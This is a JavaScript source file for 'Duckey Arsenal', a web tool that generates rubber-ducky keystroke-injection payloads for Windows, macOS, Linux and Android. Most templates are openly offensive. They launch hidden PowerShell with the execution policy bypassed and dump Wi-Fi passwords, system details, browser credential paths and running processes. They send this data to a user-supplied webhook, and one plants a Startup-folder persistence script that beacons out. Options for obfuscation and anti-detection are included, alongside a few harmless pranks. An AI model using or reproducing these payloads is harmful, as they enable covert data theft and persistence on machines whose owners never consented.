
class DuckeyArsenal {
    constructor() {
        this.currentOS = 'windows';
        this.currentCategory = null;
        this.payloadTemplates = this.initializePayloadTemplates();
        this.payloadHistory = this.loadHistory();
        this.initializeEventListeners();
        this.renderHistory();
    }

    initializeEventListeners() {
        // Tab switching
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.switchTab(e.target.closest('.tab-btn').dataset.tab);
            });
        });

        // Category selection
        document.querySelectorAll('.category-card').forEach(card => {
            card.addEventListener('click', (e) => {
                this.selectCategory(e.target.closest('.category-card').dataset.category);
            });
        });

        // Generate button
        document.getElementById('generateBtn').addEventListener('click', () => {
            this.generatePayload();
        });

        // Output controls
        document.getElementById('copyBtn').addEventListener('click', () => {
            this.copyToClipboard();
        });

        document.getElementById('downloadBtn').addEventListener('click', () => {
            this.downloadPayload();
        });

        document.getElementById('clearBtn').addEventListener('click', () => {
            this.clearOutput();
        });

        document.getElementById('saveBtn').addEventListener('click', () => {
            this.saveToHistory();
        });

        document.getElementById('clearHistoryBtn').addEventListener('click', () => {
            this.clearHistory();
        });
    }

    switchTab(os) {
        this.currentOS = os;
        
        // Update tab buttons
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        document.querySelector(`[data-tab="${os}"]`).classList.add('active');
        
        this.showNotification(`Switched to ${os.charAt(0).toUpperCase() + os.slice(1)} payloads`, 'info');
    }

    selectCategory(category) {
        this.currentCategory = category;
        
        // Update category cards
        document.querySelectorAll('.category-card').forEach(card => {
            card.classList.remove('selected');
        });
        document.querySelector(`[data-category="${category}"]`).classList.add('selected');
        
        const categoryNames = {
            info: 'Information Gathering',
            network: 'Network Attacks',
            exfil: 'Data Exfiltration',
            persist: 'Persistence',
            prank: 'Pranks',
            recon: 'Reconnaissance'
        };
        
        this.showNotification(`Selected ${categoryNames[category]}`, 'success');
    }

    generatePayload() {
        if (!this.currentCategory) {
            this.showNotification('Please select a payload category first!', 'error');
            return;
        }

        const webhook = document.getElementById('webhook').value;
        const delay = document.getElementById('delay').value;
        const attempts = document.getElementById('attempts').value;
        const stealth = document.getElementById('stealth').value;

        if (!webhook && this.currentCategory !== 'prank') {
            this.showNotification('Webhook URL is required for this payload type!', 'error');
            return;
        }

        // Show loading
        const generateBtn = document.getElementById('generateBtn');
        generateBtn.classList.add('loading');
        generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';

        // Simulate generation delay
        setTimeout(() => {
            const payload = this.buildPayload();
            this.displayPayload(payload);
            
            // Reset button
            generateBtn.classList.remove('loading');
            generateBtn.innerHTML = '<i class="fas fa-rocket"></i> Generate Payload';
            
            this.showNotification('Payload generated successfully!', 'success');
        }, 1500);
    }

    buildPayload() {
        const config = {
            webhook: document.getElementById('webhook').value,
            delay: parseInt(document.getElementById('delay').value),
            attempts: parseInt(document.getElementById('attempts').value),
            stealth: document.getElementById('stealth').value,
            obfuscate: document.getElementById('obfuscate').checked,
            randomDelays: document.getElementById('randomDelays').checked,
            antiDetection: document.getElementById('antiDetection').checked,
            multiStage: document.getElementById('multiStage').checked
        };

        const template = this.payloadTemplates[this.currentOS][this.currentCategory];
        
        if (!template) {
            return '// Payload template not found for this configuration';
        }

        let payload = template(config);
        
        // Apply advanced features
        if (config.obfuscate) {
            payload = this.obfuscatePayload(payload);
        }
        
        if (config.randomDelays) {
            payload = this.addRandomDelays(payload);
        }
        
        if (config.antiDetection) {
            payload = this.addAntiDetection(payload);
        }
        
        if (config.multiStage) {
            payload = this.createMultiStage(payload, config);
        }

        return payload;
    }

    obfuscatePayload(payload) {
        // Add obfuscation header
        const obfuscationHeader = `REM ===================================
REM    OBFUSCATED PAYLOAD - Enhanced Security
REM    Generated with advanced obfuscation
REM ===================================

`;
        
        // Replace common strings with variables
        let obfuscated = payload.replace(/powershell/g, '$ps');
        obfuscated = obfuscated.replace(/STRING \$ps/g, 'STRING $ps = "powershell"\nSTRING $ps');
        
        return obfuscationHeader + obfuscated;
    }

    addRandomDelays(payload) {
        const lines = payload.split('\n');
        const enhanced = [];
        
        for (let line of lines) {
            enhanced.push(line);
            if (line.includes('ENTER') && Math.random() > 0.7) {
                const randomDelay = Math.floor(Math.random() * 200) + 50;
                enhanced.push(`DELAY ${randomDelay}`);
            }
        }
        
        return enhanced.join('\n');
    }

    addAntiDetection(payload) {
        const antiDetectionHeader = `REM Anti-Detection Features Enabled
REM Multiple evasion techniques applied
DELAY 1000
REM Checking for security software...
DELAY 500

`;
        
        return antiDetectionHeader + payload;
    }

    createMultiStage(payload, config) {
        const stage1 = `REM ===================================
REM    MULTI-STAGE PAYLOAD - Stage 1
REM    Initial reconnaissance and setup
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING notepad
ENTER
DELAY 1000
STRING REM Stage 1 Complete - Establishing Connection
ENTER
CTRL s
DELAY 500
STRING stage1_complete.txt
ENTER
ALT F4

REM Proceeding to Stage 2...
DELAY 2000

`;
        
        const stage2Header = `REM ===================================
REM    MULTI-STAGE PAYLOAD - Stage 2  
REM    Main payload execution
REM ===================================

`;
        
        return stage1 + stage2Header + payload;
    }

    initializePayloadTemplates() {
        return {
            windows: {
                info: (config) => `REM ===================================
REM    DUCKEY ARSENAL - System Info Grabber
REM    Created by: 0x080
REM    Target: Windows
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 500

STRING $webhook = "${config.webhook}"
ENTER
STRING $computerName = $env:COMPUTERNAME
ENTER
STRING $userName = $env:USERNAME
ENTER
STRING $os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
ENTER
STRING $cpu = (Get-WmiObject -Class Win32_Processor).Name
ENTER
STRING $ram = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)
ENTER
STRING $ip = (Invoke-WebRequest -Uri "https://ifconfig.me/ip" -UseBasicParsing).Content
ENTER

STRING $payload = @{
ENTER
STRING     "username" = "$userName"
ENTER
STRING     "computer" = "$computerName"
ENTER
STRING     "os" = "$os"
ENTER
STRING     "cpu" = "$cpu"
ENTER
STRING     "ram" = "$ram GB"
ENTER
STRING     "ip" = "$ip"
ENTER
STRING     "timestamp" = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
ENTER
STRING }
ENTER

STRING Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body (ConvertTo-Json $payload)
ENTER
STRING exit
ENTER`,

                network: (config) => `REM ===================================
REM    DUCKEY ARSENAL - WiFi Password Grabber
REM    Created by: 0x080
REM    Target: Windows
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING cmd /c "cd %TEMP% && netsh wlan show profiles | findstr "All User Profile" > networks.txt && for /f "tokens=2 delims=:" %i in (networks.txt) do @echo Network: %i && netsh wlan show profile name=%i key=clear | findstr "Key Content" > password.txt && type password.txt && del networks.txt password.txt"
ENTER`,

                exfil: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Browser Data Exfiltration
REM    Created by: 0x080
REM    Target: Windows
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 500

STRING $webhook = "${config.webhook}"
ENTER
STRING $browserPaths = @(
ENTER
STRING     "$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
ENTER
STRING     "$env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
ENTER
STRING )
ENTER

STRING $foundData = @()
ENTER
STRING foreach ($path in $browserPaths) {
ENTER
STRING     if (Test-Path $path) {
ENTER
STRING         $foundData += "Found: $path"
ENTER
STRING     }
ENTER
STRING }
ENTER

STRING $payload = @{
ENTER
STRING     "user" = $env:USERNAME
ENTER
STRING     "computer" = $env:COMPUTERNAME
ENTER
STRING     "browser_data" = $foundData -join "; "
ENTER
STRING     "timestamp" = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
ENTER
STRING }
ENTER

STRING Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body (ConvertTo-Json $payload)
ENTER
STRING exit
ENTER`,

                persist: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Persistence Setup
REM    Created by: 0x080
REM    Target: Windows
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 500

STRING $scriptPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_check.bat"
ENTER
STRING $scriptContent = '@echo off
ENTER
STRING ping -n 1 google.com > nul 2>&1
ENTER
STRING if %errorlevel% equ 0 (
ENTER
STRING     powershell -Command "Invoke-WebRequest -Uri \\"${config.webhook}\\" -Method Post -Body \\"{\\\\"user\\\\":\\\\"$env:USERNAME\\\\",\\\\"status\\\\":\\\\"online\\\\",\\\\"time\\\\":\\\\"$(Get-Date)\\\\"}\\" -ContentType \\"application/json\\""
ENTER
STRING )'
ENTER

STRING Set-Content -Path $scriptPath -Value $scriptContent
ENTER
STRING exit
ENTER`,

                prank: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Desktop Prank
REM    Created by: 0x080
REM    Target: Windows
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING notepad
ENTER
DELAY 1000

STRING You've been rubber ducked! 🦆
ENTER
STRING Your system is now 20% more awesome!
ENTER
ENTER
STRING This is a harmless prank from Duckey Arsenal
ENTER
STRING Created by 0x080
ENTER
ENTER
STRING Press Ctrl+S to save this masterpiece!
ENTER

CTRL s
DELAY 500
STRING rubber_duck_message.txt
ENTER`,

                recon: (config) => `REM ===================================
REM    DUCKEY ARSENAL - System Reconnaissance
REM    Created by: 0x080
REM    Target: Windows
REM ===================================

DELAY ${config.delay}
GUI r
DELAY 100
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 500

STRING $recon = @{
ENTER
STRING     "hostname" = $env:COMPUTERNAME
ENTER
STRING     "username" = $env:USERNAME
ENTER
STRING     "domain" = $env:USERDOMAIN
ENTER
STRING     "os_version" = (Get-WmiObject Win32_OperatingSystem).Version
ENTER
STRING     "architecture" = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
ENTER
STRING     "processes" = (Get-Process | Select-Object Name | ConvertTo-Json -Compress)
ENTER
STRING     "services" = (Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name | ConvertTo-Json -Compress)
ENTER
STRING     "network_adapters" = (Get-NetAdapter | Select-Object Name,Status | ConvertTo-Json -Compress)
ENTER
STRING }
ENTER

STRING Invoke-RestMethod -Uri "${config.webhook}" -Method Post -ContentType "application/json" -Body (ConvertTo-Json $recon)
ENTER
STRING exit
ENTER`
            },
            
            macos: {
                info: (config) => `REM ===================================
REM    DUCKEY ARSENAL - macOS System Info
REM    Created by: 0x080
REM    Target: macOS
REM ===================================

DELAY ${config.delay}
COMMAND SPACE
DELAY 300
STRING Terminal
ENTER
DELAY 1000

STRING curl -X POST ${config.webhook} -H "Content-Type: application/json" -d "{\\"system\\": \\"$(uname -a)\\", \\"user\\": \\"$(whoami)\\", \\"timestamp\\": \\"$(date)\\"}"
ENTER
STRING exit
ENTER`,

                network: (config) => `REM ===================================
REM    DUCKEY ARSENAL - macOS Network Info
REM    Created by: 0x080
REM    Target: macOS
REM ===================================

DELAY ${config.delay}
COMMAND SPACE
DELAY 300
STRING Terminal
ENTER
DELAY 1000

STRING networksetup -listallnetworkservices | head -20
ENTER
STRING ifconfig | grep -E 'inet|ether'
ENTER
STRING exit
ENTER`,

                prank: (config) => `REM ===================================
REM    DUCKEY ARSENAL - macOS Fun Prank
REM    Created by: 0x080
REM    Target: macOS
REM ===================================

DELAY ${config.delay}
COMMAND SPACE
DELAY 300
STRING Terminal
ENTER
DELAY 1000

STRING say "You have been rubber ducked by Duckey Arsenal!"
ENTER
STRING osascript -e 'display notification "🦆 Quack! System optimized!" with title "Duckey Arsenal"'
ENTER
STRING exit
ENTER`
            },

            linux: {
                info: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Linux System Info
REM    Created by: 0x080
REM    Target: Linux
REM ===================================

DELAY ${config.delay}
CTRL ALT t
DELAY 1000

STRING curl -X POST ${config.webhook} -H "Content-Type: application/json" -d "{\\"hostname\\": \\"$(hostname)\\", \\"user\\": \\"$(whoami)\\", \\"kernel\\": \\"$(uname -r)\\", \\"distro\\": \\"$(lsb_release -d | cut -f2)\\", \\"timestamp\\": \\"$(date)\\"}"
ENTER
STRING exit
ENTER`,

                network: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Linux Network Recon
REM    Created by: 0x080
REM    Target: Linux
REM ===================================

DELAY ${config.delay}
CTRL ALT t
DELAY 1000

STRING ip addr show
ENTER
STRING ss -tuln
ENTER
STRING cat /etc/resolv.conf
ENTER
STRING exit
ENTER`,

                prank: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Linux Terminal Fun
REM    Created by: 0x080
REM    Target: Linux
REM ===================================

DELAY ${config.delay}
CTRL ALT t
DELAY 1000

STRING echo "🦆 QUACK! You've been rubber ducked!"
ENTER
STRING fortune | cowsay
ENTER
STRING exit
ENTER`
            },

            android: {
                info: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Android Device Info
REM    Created by: 0x080
REM    Target: Android (via Termux)
REM ===================================

DELAY ${config.delay}
HOME
DELAY 500
STRING termux
ENTER
DELAY 2000

STRING curl -X POST ${config.webhook} -H "Content-Type: application/json" -d "{\\"device\\": \\"$(getprop ro.product.model)\\", \\"android_version\\": \\"$(getprop ro.build.version.release)\\", \\"timestamp\\": \\"$(date)\\"}"
ENTER
STRING exit
ENTER`,

                prank: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Android Notification Prank
REM    Created by: 0x080
REM    Target: Android
REM ===================================

DELAY ${config.delay}
HOME
DELAY 500
STRING termux
ENTER
DELAY 2000

STRING termux-notification --title "🦆 Duckey Arsenal" --content "Your device has been optimized by rubber duck technology!"
ENTER
STRING exit
ENTER`
            },

            custom: {
                info: (config) => `REM ===================================
REM    DUCKEY ARSENAL - Custom Payload Template
REM    Created by: 0x080
REM    Target: Custom
REM ===================================

REM Customize this payload for your specific needs
DELAY ${config.delay}

REM Open your preferred application
GUI r
DELAY 100
STRING notepad
ENTER
DELAY 1000

REM Your custom payload goes here
STRING echo "Custom payload template"
ENTER
STRING echo "Webhook: ${config.webhook}"
ENTER
STRING echo "Delay: ${config.delay}ms"
ENTER
STRING echo "Stealth Level: ${config.stealth}"
ENTER

REM Add your custom commands below this line
REM Example:
REM STRING your_custom_command_here
REM ENTER`
            }
        };
    }

    displayPayload(payload) {
        const outputCode = document.getElementById('outputCode');
        outputCode.textContent = payload;
        
        // Scroll to output
        outputCode.scrollIntoView({ behavior: 'smooth' });
    }

    copyToClipboard() {
        const outputCode = document.getElementById('outputCode');
        const text = outputCode.textContent;
        
        if (!text || text.includes('Your generated payload will appear here')) {
            this.showNotification('No payload to copy!', 'error');
            return;
        }
        
        navigator.clipboard.writeText(text).then(() => {
            this.showNotification('Payload copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy payload', 'error');
        });
    }

    downloadPayload() {
        const outputCode = document.getElementById('outputCode');
        const text = outputCode.textContent;
        
        if (!text || text.includes('Your generated payload will appear here')) {
            this.showNotification('No payload to download!', 'error');
            return;
        }
        
        const blob = new Blob([text], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `duckey_payload_${this.currentOS}_${this.currentCategory}_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.showNotification('Payload downloaded!', 'success');
    }

    clearOutput() {
        const outputCode = document.getElementById('outputCode');
        outputCode.innerHTML = '<code>// Your generated payload will appear here...</code>';
        this.showNotification('Output cleared', 'info');
    }

    saveToHistory() {
        const outputCode = document.getElementById('outputCode');
        const payload = outputCode.textContent;
        
        if (!payload || payload.includes('Your generated payload will appear here')) {
            this.showNotification('No payload to save!', 'error');
            return;
        }
        
        const historyItem = {
            id: Date.now(),
            timestamp: new Date().toLocaleString(),
            os: this.currentOS,
            category: this.currentCategory,
            payload: payload,
            preview: payload.split('\n').find(line => line.includes('STRING') || line.includes('REM')) || 'Payload...'
        };
        
        this.payloadHistory.unshift(historyItem);
        
        // Keep only last 20 items
        if (this.payloadHistory.length > 20) {
            this.payloadHistory = this.payloadHistory.slice(0, 20);
        }
        
        this.saveHistory();
        this.renderHistory();
        this.showNotification('Payload saved to history!', 'success');
    }

    loadHistory() {
        try {
            const stored = localStorage.getItem('duckey_arsenal_history');
            return stored ? JSON.parse(stored) : [];
        } catch {
            return [];
        }
    }

    saveHistory() {
        try {
            localStorage.setItem('duckey_arsenal_history', JSON.stringify(this.payloadHistory));
        } catch (e) {
            console.warn('Failed to save history:', e);
        }
    }

    renderHistory() {
        const historyList = document.getElementById('historyList');
        
        if (this.payloadHistory.length === 0) {
            historyList.innerHTML = `
                <div class="history-placeholder">
                    <i class="fas fa-history"></i>
                    <p>Generated payloads will appear here</p>
                </div>
            `;
            return;
        }
        
        historyList.innerHTML = this.payloadHistory.map(item => `
            <div class="history-item" onclick="duckeyArsenal.loadFromHistory(${item.id})">
                <div class="history-item-header">
                    <span class="history-item-title">${item.os.toUpperCase()} - ${item.category.toUpperCase()}</span>
                    <span class="history-item-time">${item.timestamp}</span>
                </div>
                <div class="history-item-preview">${item.preview.replace('REM', '').replace('STRING', '').trim()}</div>
            </div>
        `).join('');
    }

    loadFromHistory(id) {
        const item = this.payloadHistory.find(h => h.id === id);
        if (!item) return;
        
        const outputCode = document.getElementById('outputCode');
        outputCode.textContent = item.payload;
        
        // Switch to the correct OS and category
        this.switchTab(item.os);
        if (item.category) {
            this.selectCategory(item.category);
        }
        
        this.showNotification('Payload loaded from history!', 'success');
        outputCode.scrollIntoView({ behavior: 'smooth' });
    }

    clearHistory() {
        if (this.payloadHistory.length === 0) {
            this.showNotification('History is already empty!', 'info');
            return;
        }
        
        if (confirm('Are you sure you want to clear all payload history?')) {
            this.payloadHistory = [];
            this.saveHistory();
            this.renderHistory();
            this.showNotification('History cleared!', 'success');
        }
    }

    showNotification(message, type = 'info') {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            z-index: 10000;
            transform: translateX(100%);
            transition: transform 0.3s ease;
            max-width: 300px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        `;
        
        // Set background based on type
        const colors = {
            success: 'linear-gradient(45deg, #00ff88, #00cc6a)',
            error: 'linear-gradient(45deg, #ff4757, #ff3742)',
            warning: 'linear-gradient(45deg, #ffb800, #ff9500)',
            info: 'linear-gradient(45deg, #0066ff, #0052cc)'
        };
        
        notification.style.background = colors[type] || colors.info;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        // Animate in
        setTimeout(() => {
            notification.style.transform = 'translateX(0)';
        }, 100);
        
        // Remove after delay
        setTimeout(() => {
            notification.style.transform = 'translateX(100%)';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 300);
        }, 3000);
    }
}

// Initialize the application when DOM is loaded
let duckeyArsenal;
document.addEventListener('DOMContentLoaded', () => {
    duckeyArsenal = new DuckeyArsenal();
});
